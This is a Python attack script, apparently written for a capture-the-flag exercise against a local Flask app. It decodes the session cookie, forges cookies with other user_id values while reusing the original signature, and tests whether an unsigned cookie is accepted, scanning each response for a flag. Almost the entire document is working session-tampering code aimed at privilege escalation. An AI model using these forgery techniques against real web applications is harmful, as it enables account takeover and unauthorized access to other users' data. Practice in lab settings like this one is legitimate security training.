import requests
import base64
import json
import re

target_url = "http://127.0.0.1:33198/"
session_value = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"

print("FLASK SESSION ANALYSIS")
print("="*60)

# Test current session
print("\n[+] Testing current session")
cookies = {'session': session_value}
resp = requests.get(target_url, cookies=cookies, allow_redirects=True, timeout=10)
print(f"Status: {resp.status_code} | URL: {resp.url}")
print(f"Length: {len(resp.text)}")

# Check for flag
if 'FLAG{' in resp.text:
    import re
    flag = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag:
        print(f"[!] FLAG FOUND: {flag.group(0)}")

# Decode session
print("\n[+] Decoding session cookie")
parts = session_value.split('.')
print(f"Parts: {len(parts)}")

if len(parts) == 3:
    payload_part = parts[1]
    signature = parts[2]
    print("[+] Format: .<payload>.<signature>")
elif len(parts) == 2:
    payload_part = parts[0]
    signature = parts[1]
    print("[+] Format: <payload>.<signature>")
else:
    payload_part = None
    signature = None
    
if payload_part:
    print(f"Payload: {payload_part}")
    # Fix padding
    padding = 4 - (len(payload_part) % 4)
    if padding != 4:
        payload_padded = payload_part + '=' * padding
    else:
        payload_padded = payload_part
    
    decoded = base64.urlsafe_b64decode(payload_padded)
    session_data = json.loads(decoded)
    print(f"Session data: {json.dumps(session_data, indent=2)}")
    
    # Extract user_id
    if 'user_id' in session_data:
        user_id = session_data['user_id']
        print(f"Current user_id: {user_id}")

# Test modified sessions
print("\n[+] Testing session manipulation")
test_ids = [1, 2, 3, 0, 99999, 100033, 100034]

for test_id in test_ids:
    if 'session_data' in locals():
        modified = session_data.copy()
        modified['user_id'] = test_id
        modified_json = json.dumps(modified, separators=(',', ':'))
        modified_b64 = base64.urlsafe_b64encode(modified_json.encode()).decode().rstrip('=')
        
        if len(parts) == 3:
            test_session = f".{modified_b64}.{signature}"
        else:
            test_session = f"{modified_b64}.{signature}"
            
        test_cookies = {'session': test_session}
        resp = requests.get(target_url, cookies=test_cookies, allow_redirects=False, timeout=5)
        
        print(f"Test user_id={test_id}: Status {resp.status_code}")
        if resp.status_code == 200:
            print(f"  [!] ACCEPTED!")
            if 'FLAG{' in resp.text:
                flag = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag:
                    print(f"  [!] FLAG: {flag.group(0)}")

# Test unsigned
print("\n[+] Testing unsigned session")
if 'session_data' in locals():
    modified = session_data.copy()
    modified['user_id'] = 1
    modified_json = json.dumps(modified, separators=(',', ':'))
    unsigned = base64.urlsafe_b64encode(modified_json.encode()).decode().rstrip('=')
    
    resp = requests.get(target_url, cookies={'session': unsigned}, allow_redirects=False, timeout=5)
    print(f"Unsigned session: Status {resp.status_code}")
    if resp.status_code == 200 and target_url in resp.url:
        print("[!] UNSIGNED ACCEPTED - NO VALIDATION!")
        if 'FLAG{' in resp.text:
            flag = re.search(r'FLAG\{[^}]+\}', resp.text)
            if flag:
                print(f"[!] FLAG: {flag.group(0)}")

print("\n[+] Analysis complete")
